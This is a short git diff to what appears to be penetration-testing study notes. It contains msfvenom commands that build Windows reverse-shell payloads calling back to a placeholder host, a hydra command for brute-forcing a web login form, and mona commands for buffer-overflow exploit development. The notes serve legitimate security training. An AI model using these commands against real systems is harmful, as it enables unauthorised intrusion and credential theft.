@@ -33,7 +33,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LISTENING_IP_ADDRESS> LPORT=<
 
 ### msfvenom (Simple Windows Payload Shell)
 ```
-msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT EXITFUNC=thread -f py -b [bad characters]
+msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> EXITFUNC=thread -f py -b [bad characters]
 ```
 
 ### hydra (http-post-form)
@@ -41,8 +41,13 @@ msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT EXITFUNC=thread -f py 
 hydra -l <USERNAME> -P <PASSWORD_LIST> http-post-form <IP_ADDRESS> "<DIRECTORY> : <RAW_POST_REQUEST> <ERROR_MESSAGE>"
 ```
 
-### Immunity Debugger (Finding a jump point)
+### Immunity Debugger (Finding bad characters)
+```
+!mona bytearray -b "\x00"
+!mona compare -f C:\mona\oscp\bytearray.bin -a <address>
+```
 
+### Immunity Debugger (Finding a jump point)
 ```
 !mona jmp -r esp -cpb [bad characters]
 ```
